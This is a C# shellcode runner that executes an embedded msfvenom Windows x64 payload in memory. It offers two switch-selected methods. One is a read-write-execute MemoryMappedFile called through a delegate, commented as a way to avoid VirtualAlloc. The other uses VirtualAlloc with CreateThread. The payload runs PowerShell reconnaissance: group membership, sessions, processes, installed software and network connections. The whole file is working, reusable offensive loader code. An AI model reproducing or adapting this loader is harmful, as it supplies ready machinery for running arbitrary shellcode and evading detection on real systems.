using System;
using System.IO.MemoryMappedFiles;
using System.Runtime.InteropServices;
using System.Text;

namespace reflect
{
    class Emu
    {
        // DLL function imports 
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualFree(
            IntPtr lpAddress,
            uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out uint lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds);

        // Delegate declaration for Dinvoke()
        delegate void Reflection();

        static void Dinvoke(byte[] buffer)
        {
            // source for MemoryMappedFile technique to avoid VirtualAlloc(): https://atom0s.com/posts/2017/2017-04-30-executing-shellcode-in-c%23/
            unsafe
            {
                // Creates space in memory "__buffer" with MemoryFile and writes shellcode via FileViewAccessor
                MemoryMappedFile MemoryFile = MemoryMappedFile.CreateNew("__buffer", buffer.Length, MemoryMappedFileAccess.ReadWriteExecute);
                MemoryMappedViewAccessor FileViewAccessor = MemoryFile.CreateViewAccessor(0, buffer.Length, MemoryMappedFileAccess.ReadWriteExecute);
                FileViewAccessor.WriteArray(0, buffer, 0, buffer.Length);

                // getting pointer for our space in memory
                var MemoryPointer = (byte*)0;
                FileViewAccessor.SafeMemoryMappedViewHandle.AcquirePointer(ref MemoryPointer);

                // Marshal Delegate declaration
                var reflection = (Reflection)Marshal.GetDelegateForFunctionPointer(new IntPtr(MemoryPointer), typeof(Reflection));
                reflection();

                VirtualFree((IntPtr)MemoryPointer, 0, 0x8000);
            }


            return;
        }

        static void KernelReflect(byte[] buffer)
        {
            uint ThreadID;

            // Uses all kernel32 methods to allocate and run shellcode with a marshal used to move code
            IntPtr MemoryPointer = VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(buffer.Length), 0x1000, 0x40);
            Marshal.Copy(buffer, 0x0, MemoryPointer, buffer.Length);
            IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, MemoryPointer, IntPtr.Zero, 0, out ThreadID);

            WaitForSingleObject(threadHandle, 0xFFFFFFFF);
        }
        static void Main(string[] args)
        {
            // msfvenom -a x64 --platform windows -p windows/x64/exec cmd='powershell "whoami /groups;qwinsta;tasklist;get-wmiobject Win32_product;netstat -ano;echo ''press enter to close...'';exit"' -f csharp -v buffer
            byte[] buffer = new byte[387] {0xfc,0x48,0x83,0xe4,0xf0,
            0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,
            0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,
            0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,
            0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
            0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,
            0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,
            0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,
            0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,
            0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,
            0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,
            0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,
            0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,
            0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,
            0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,
            0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,
            0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,
            0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,
            0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,
            0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,
            0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
            0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
            0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x70,0x6f,
            0x77,0x65,0x72,0x73,0x68,0x65,0x6c,0x6c,0x20,0x22,0x77,0x68,
            0x6f,0x61,0x6d,0x69,0x20,0x2f,0x67,0x72,0x6f,0x75,0x70,0x73,
            0x3b,0x71,0x77,0x69,0x6e,0x73,0x74,0x61,0x3b,0x74,0x61,0x73,
            0x6b,0x6c,0x69,0x73,0x74,0x3b,0x67,0x65,0x74,0x2d,0x77,0x6d,
            0x69,0x6f,0x62,0x6a,0x65,0x63,0x74,0x20,0x57,0x69,0x6e,0x33,
            0x32,0x5f,0x70,0x72,0x6f,0x64,0x75,0x63,0x74,0x3b,0x6e,0x65,
            0x74,0x73,0x74,0x61,0x74,0x20,0x2d,0x61,0x6e,0x6f,0x3b,0x65,
            0x63,0x68,0x6f,0x20,0x70,0x72,0x65,0x73,0x73,0x20,0x65,0x6e,
            0x74,0x65,0x72,0x20,0x74,0x6f,0x20,0x63,0x6c,0x6f,0x73,0x65,
            0x2e,0x2e,0x2e,0x3b,0x65,0x78,0x69,0x74,0x22,0x00};

            if (args.Length == 0)
            {
                Dinvoke(buffer);
            }
            else if (args[0] == "-d" || args[0] == "--dinvoke")
            {
                Dinvoke(buffer);
            }
            else if (args[0] == "-k" || args[0] == "--kernel")
            {
                KernelReflect(buffer);
            }
            else if (args[0] == "-h" || args[0] == "--help")
            {
                Console.WriteLine("please run the binary with a valid input! ");
                Console.WriteLine("'-d' or '--dinvoke' to run Delegate Reflection [default], or '-k' or '--kernel' to run Reflection via kernel32.dll");
            }
            else
            {
                Console.WriteLine("Invalid input! " + args[0]);
            }

            //Console.Write("Press enter to close the window... ");
            //Console.ReadLine();
        }
    }
}
